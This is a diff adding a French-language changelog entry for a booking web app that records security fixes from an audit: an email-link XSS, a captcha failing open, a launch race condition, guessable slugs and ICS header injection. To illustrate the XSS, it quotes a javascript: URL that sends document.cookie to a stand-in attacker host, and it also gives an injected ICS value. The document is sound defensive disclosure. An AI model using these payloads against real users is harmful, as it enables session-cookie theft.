@@ -1,5 +1,41 @@
 # Changelog
 
+## v2.250.1 (2026-04-27)
+
+### Booking : durcissement post-audit (1 BLOQUANT + 5 IMPORTANT + 2 NICE)
+
+Audit refacto + securite sur la stack booking v2.245-v2.250. Synthese des fixes :
+
+**BLOQUANT — XSS via `joinUrl` dans tous les mails (B1)** :
+
+- `<a href="${joinUrl}">` injecte la valeur sans whitelist de scheme ni escape attribut. Un prof posait `fallbackVisioUrl: "javascript:fetch('https://attacker/?c='+document.cookie)"` -> le mail HTML execute le payload chez l'etudiant + tuteur + co-prof a chaque clic.
+- Fix : nouveau helper `safeHttpUrl(u)` (whitelist `^https?://`, parse via `URL`) dans `server/utils/escHtml.js`. Applique aux 5 templates (`sendBookingConfirmation`, `sendBookingCancellation`, `sendBookingReminder`, `sendBookingReschedule`, `sendCampaignInvite`, `sendTripartiteConfirmation`). Plus tous les `href` passent par `escHtml(safeHttpUrl(...))`.
+- Defense en profondeur cote zod : `fallbackVisioUrl` dans `teacherAdmin.js` et `campaigns.js` refuse maintenant explicitement les schemes non-http(s) via `.refine()`.
+
+**IMPORTANT** :
+
+- **I2 — DELETE campagne avec bookings** : la suppression effacait l'event_type "fantome" qui faisait disparaitre les bookings historiques en cascade. Nouveau guard `countCampaignBookings()` rejette le DELETE si > 0 reservations confirmees, message clair "Cloture-la plutot".
+- **I3 — captcha fail-open silencieux** : si `TURNSTILE_SECRET_KEY` disparait en prod (rotation rate, redeploy partiel), le captcha desactivait sans alerte. Ajout d'un `log.warn` au boot quand `NODE_ENV=production` et la var est manquante.
+- **I5 — race condition double-launch** : double-clic sur "Lancer" envoyait potentiellement 2x les mails. Nouveau helper `transitionCampaignStatus(id, fromStatus, toStatus)` qui fait un `UPDATE ... WHERE id=? AND status=?` atomique ; si `changes() === 0`, on rejette avec 400.
+- **I6 — slug enumerable si user-choisi long** : `ensurePublicSlug` n'allongeait que si `< 10 chars`. Un prof avec slug `cesi-rohan-2026` (15 chars) restait devinable. Le helper genere maintenant SYSTEMATIQUEMENT un suffixe `-XXXXX` (5 chars hex) sauf si le slug en porte deja un (idempotence).
+
+**NICE-TO-HAVE** :
+
+- **N2 — `escIcs` ne strippait pas `\r`** : un attendee `name = "X\rNEWHEADER:foo"` injectait une nouvelle property ICS. Regex etendue a `/\r\n|\r|\n/g`.
+
+**Refactoring (impact propre)** :
+
+- Code mort retire : `slotsByDate`, `weekStart` (refs/computed) dans `usePublicBooking.ts`, `slotsByDate`, `sortedDates` dans `useCampaignBooking.ts`. La refonte `BookingFlow.vue` recalcule son propre groupement, ces exports etaient orphelins.
+- `fetchSlots(weekOffset)` (single-week) supprime de `usePublicBooking` au profit du `fetchSlotsRange(8)` deja en place.
+
+**Tests** : 21/21 booking tests passent. Typecheck clean.
+
+**Non traite dans ce patch** (a planifier) :
+
+- Refactoring du service `bookingService.confirmBooking` pour mutualiser les 3 handlers POST `/book` qui dupliquent ~250 lignes (visio + ICS + email + reminder + socket). Effort 1/2 journee, faut une suite de tests d'integration d'abord.
+- Renommage `bookings.teams_join_url` -> `bookings.visio_join_url` (la colonne contient deja du Jitsi). Migration + 9 callsites.
+- Couverture tests campaigns/campaignPublic/jitsi (zero test sur ces routes nouvelles).
+
 ## v2.250.0 (2026-04-27)
 
 ### Booking : refonte UX/UI des pages publiques (style Calendly)
